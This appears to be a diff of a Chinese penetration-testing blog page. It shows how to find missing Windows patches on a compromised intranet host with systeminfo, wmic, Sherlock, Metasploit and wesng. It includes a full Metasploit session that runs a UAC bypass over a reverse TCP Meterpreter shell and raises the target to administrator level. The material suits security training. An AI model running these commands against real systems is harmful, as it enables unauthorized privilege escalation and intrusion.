@@ -437,14 +437,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    8 分
                 </div>
                 
 
@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -466,43 +469,49 @@
             <div id="articleContent">
                 <h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p>
 <h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p>
-<pre><code>C:\Users\teamssix&gt; systeminfo
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt; systeminfo
 ……内容过多，此处省略……
 修补程序: 安装了 2 个修补程序。
          [01]: KB2999226
          [02]: KB976902
-……内容过多，此处省略……</code></pre>
+……内容过多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p>
-<pre><code>wmic qfe get Caption,Description,HotfixID,InstalledOn</code></pre>
-<pre><code>C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOn
+<pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotfixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOn
 
 Caption                                     Description  HotFixID   InstalledOn
-http://support.microsoft.com/?kbid=2999226  Update       KB2999226  11/26/2020
-http://support.microsoft.com/?kbid=976902   Update       KB976902   11/21/2010</code></pre>
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2999226  Update       KB2999226  11&#x2F;26&#x2F;2020
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;976902   Update       KB976902   11&#x2F;21&#x2F;2010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。</p>
 <h2 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h2><h3 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h3><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p>
 <p>Sherlock 项目地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
 <p>导入脚本</p>
-<pre><code>Import-Module .\Sherlock.ps1</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Sherlock.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>Sherlock 命令</p>
-<pre><code>Find-ALLVulns    搜索所有未安装的补丁
-Find-MS16032    搜索单个漏洞</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Find-ALLVulns	搜索所有未安装的补丁
+Find-MS16032	搜索单个漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息。</p>
-<pre><code>msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches
+<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patches
 
-msf6 post(windows/gather/enum_patches) &gt; set session 1
-session =&gt; 1
+msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; set session 1
+session &#x3D;&gt; 1
 
-msf6 post(windows/gather/enum_patches) &gt; run
-[+] KB2999226 installed on 11/26/2020
-[+] KB976902 installed on 11/21/2010
-[*] Post module execution completed</code></pre>
+msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; run
+[+] KB2999226 installed on 11&#x2F;26&#x2F;2020
+[+] KB976902 installed on 11&#x2F;21&#x2F;2010
+[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p>
 <p>首先查看下当前会话权限</p>
-<pre><code>msf6 post(windows/gather/enum_patches) &gt; sessions 1
+<pre class="line-numbers language-none"><code class="language-none">msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; sessions 1
 [*] Starting interaction with 1...
 
-meterpreter &gt; execute -if &quot;whoami /groups&quot;
+meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;
 Process 3048 created.
 Channel 6 created.
 
@@ -510,7 +519,7 @@ Channel 6 created.
 -----------------
 
 组名                                   类型   SID          属性
-====================================== ====== ============ ==============================
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
 BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组
 BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
@@ -520,29 +529,31 @@ NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启�
 NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
 LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
 NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
-Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组</code></pre>
+Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>可以看到当前权限为 Medium Mandatory Level，即普通权限</p>
 <p>我们使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p>
-<pre><code>meterpreter &gt; background
+<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; background
 [*] Backgrounding session 1...
 
-msf6 post(windows/gather/enum_patches) &gt; use post/multi/recon/local_exploit_suggester
-msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1
-session =&gt; 1
-msf6 post(multi/recon/local_exploit_suggester) &gt; run
+msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester
+msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 1
+session &#x3D;&gt; 1
+msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; run
 
-[*] 172.16.214.4 - Collecting local exploits for x86/windows...
+[*] 172.16.214.4 - Collecting local exploits for x86&#x2F;windows...
 [*] 172.16.214.4 - 38 exploit checks are being tried...
-[+] 172.16.214.4 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
-[*] Post module execution completed</code></pre>
+[+] 172.16.214.4 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.
+[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p>
-<pre><code>msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/bypassuac_eventvwr
-[*] Using configured payload windows/meterpreter/reverse_tcp
+<pre class="line-numbers language-none"><code class="language-none">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr
+[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp
 
-msf6 exploit(windows/local/bypassuac_eventvwr) &gt; set session 1
-session =&gt; 1
+msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1
+session &#x3D;&gt; 1
 
-msf6 exploit(windows/local/bypassuac_eventvwr) &gt; run
+msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; run
 [*] Started reverse TCP handler on 10.101.22.38:4444
 [*] UAC is Enabled, checking level...
 [+] Part of Administrators group! Continuing...
@@ -555,7 +566,7 @@ msf6 exploit(windows/local/bypassuac_eventvwr) &gt; run
 [*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800
 [*] Cleaning up registry keys ...
 
-meterpreter &gt; execute -if &quot;whoami /groups&quot;
+meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;
 Process 3048 created.
 Channel 1 created.
 
@@ -563,7 +574,7 @@ Channel 1 created.
 -----------------
 
 组名                                 类型   SID          属性
-==================================== ====== ============ ==========================================
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
 BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者
 BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
@@ -573,17 +584,21 @@ NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用
 NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
 LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
 NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
-Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组</code></pre>
+Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p>
 <h3 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h3><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富，不过实测 wesng 还未支持 Windows 11 『手动狗头』</p>
 <p>wesng 的安装方法也很简单</p>
-<pre><code>git clone https://github.com/bitsadmin/wesng.git
+<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;wesng.git
 cd wesng
-python wes.py --update</code></pre>
+python wes.py --update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中。</p>
-<pre><code>systeminfo &gt; info.txt</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>直接使用 wesng 即可</p>
-<pre><code>python wes.py info.txt</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python wes.py info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210706145250.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p>
 <blockquote>
@@ -1019,7 +1034,7 @@ python wes.py --update</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
